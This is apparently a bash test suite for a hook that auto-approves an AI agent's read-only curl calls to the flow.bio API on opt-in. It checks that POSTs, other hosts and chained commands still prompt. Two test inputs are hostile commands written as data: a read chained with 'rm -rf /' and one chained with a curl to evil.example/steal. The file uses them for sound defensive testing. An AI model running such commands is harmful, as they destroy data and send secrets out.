#!/usr/bin/env bash
# Tests for flow-read-approve.sh: pipe mock hook-input JSON to the script and
# assert stdout. Run: bash flow-read-approve.test.sh
set -u

script_dir=$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)
hook="$script_dir/flow-read-approve.sh"

pass=0
fail=0

# A version string that is deliberately not the real one, proving the match is
# version-agnostic rather than pinned to whatever plugin.json currently ships.
ua='flow-ai/9.9.9-test'

make_input() {
  jq -cn --arg cmd "$1" '{tool_input: {command: $cmd}}'
}

# run_hook <opt-in value ("" leaves it unset)> <hook-input JSON>
run_hook() {
  local optin="$1" input="$2"
  if [[ -z "$optin" ]]; then
    printf '%s' "$input" | FLOW_AI_AUTO_APPROVE_READS= bash "$hook"
  else
    printf '%s' "$input" | FLOW_AI_AUTO_APPROVE_READS="$optin" bash "$hook"
  fi
}

assert_allow() {
  local name="$1" out="$2"
  local decision
  decision=$(printf '%s' "$out" | jq -r '.hookSpecificOutput.permissionDecision' 2>/dev/null)
  if [[ "$decision" == "allow" ]]; then
    pass=$((pass + 1))
  else
    fail=$((fail + 1))
    printf 'FAIL: %s\n  expected permissionDecision "allow", got: %s\n' "$name" "$out"
  fi
}

assert_empty() {
  local name="$1" out="$2"
  if [[ -z "$out" ]]; then
    pass=$((pass + 1))
  else
    fail=$((fail + 1))
    printf 'FAIL: %s\n  expected empty output, got: %s\n' "$name" "$out"
  fi
}

# 1. Opted in, canonical authenticated read to app.flow.bio.
read_cmd="curl -s -A \"$ua\" -H \"Authorization: Bearer \$(< ~/.config/flow/api-token)\" --get \"https://app.flow.bio/api/pipelines\""
assert_allow "authenticated flow.bio read is approved" \
  "$(run_hook 1 "$(make_input "$read_cmd")")"

# 2. Opted in, read whose host comes from the FLOW_API_URL override.
override_cmd="curl -s -A \"$ua\" --get \"\${FLOW_API_URL}/pipelines\""
assert_allow "FLOW_API_URL-override read is approved" \
  "$(run_hook 1 "$(make_input "$override_cmd")")"

# 3. Opted in, pipeline run (POST) must keep prompting.
run_pipeline_cmd="curl -s -A \"$ua\" -H \"Authorization: Bearer \$(< ~/.config/flow/api-token)\" -X POST --data '{}' \"https://app.flow.bio/api/pipelines/versions/12/run\""
assert_empty "pipeline run (POST) is not approved" \
  "$(run_hook 1 "$(make_input "$run_pipeline_cmd")")"

# 4. Opted in, curl to a non-flow host must keep prompting.
non_flow_cmd="curl -s -A \"$ua\" --get \"https://example.com/api/pipelines\""
assert_empty "non-flow host is not approved" \
  "$(run_hook 1 "$(make_input "$non_flow_cmd")")"

# 5. Opted in, compound command that merely contains a flow read must not match.
compound_cmd="for i in 1 2; do tot=\$(curl -s -A \"$ua\" --get \"https://app.flow.bio/api/samples\"); done"
assert_empty "compound command containing a flow read is not approved" \
  "$(run_hook 1 "$(make_input "$compound_cmd")")"

# 6. Not opted in: a command that would otherwise match still prompts.
assert_empty "opt-out leaves the read prompting" \
  "$(run_hook "" "$(make_input "$read_cmd")")"

# 7. Opted in, malformed input (no tool_input.command) exits cleanly with no output.
assert_empty "missing tool_input.command produces no output" \
  "$(run_hook 1 '{"tool_input": {}}')"

# 8. The skill pipes reads through jq; a single pipe to jq must stay approved.
piped_cmd="$read_cmd | jq '.count'"
assert_allow "read piped to jq stays approved" \
  "$(run_hook 1 "$(make_input "$piped_cmd")")"

# 9. A valid read with a chained destructive tail must not be approved: a
# PreToolUse allow suppresses the prompt for the whole Bash line, not just curl.
chained_semicolon_cmd="$read_cmd; rm -rf /"
assert_empty "read with a ; chained command is not approved" \
  "$(run_hook 1 "$(make_input "$chained_semicolon_cmd")")"

# 10. Same for && chaining.
chained_and_cmd="$read_cmd && curl https://evil.example/steal"
assert_empty "read with an && chained command is not approved" \
  "$(run_hook 1 "$(make_input "$chained_and_cmd")")"

# 11. A pipeline run written as --request POST (no --get) is not approved.
alt_post_cmd="curl -s -A \"$ua\" --request POST --data '{}' \"https://app.flow.bio/api/pipelines/versions/12/run\""
assert_empty "pipeline run via --request POST is not approved" \
  "$(run_hook 1 "$(make_input "$alt_post_cmd")")"

printf '\n%d passed, %d failed\n' "$pass" "$fail"
[[ "$fail" -eq 0 ]]
